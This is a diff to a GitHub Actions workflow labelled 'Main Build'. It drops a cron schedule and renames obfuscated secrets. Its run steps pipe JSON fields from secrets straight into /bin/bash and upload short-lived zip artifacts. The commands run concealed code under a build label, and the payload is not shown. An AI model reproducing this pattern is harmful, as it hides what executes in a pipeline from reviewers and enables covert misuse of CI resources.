@@ -2,8 +2,6 @@ name: Main Build
 on:
   workflow_dispatch:
 
-  schedule:
-    - cron: '11 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -20,17 +18,15 @@ jobs:
           fetch-depth: 1
       - name: Run build
         env:
-          tjl842: ${{ secrets.tjl842 }}
+          eihu94: ${{ secrets.eihu94 }}
         run: |
-          printf '%s' "$tjl842" | jq -r .b68896 | /bin/bash
-          printf '%s' "$bd87855" | jq -r .hc30345 | /bin/bash
-          echo $dae180 | jq -r .rqkyf1698 | /bin/bash
-          printf '%s' "$xz51" | jq -r .yi904 | /bin/bash
+          printf '%s' "$eihu94" | jq -r .tv5894 | /bin/bash
+          echo $idn931 | jq -r .cpw05 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: szZbRXWp
+          name: FH7KWiSW
           path: "*.zip"
           retention-days: 1
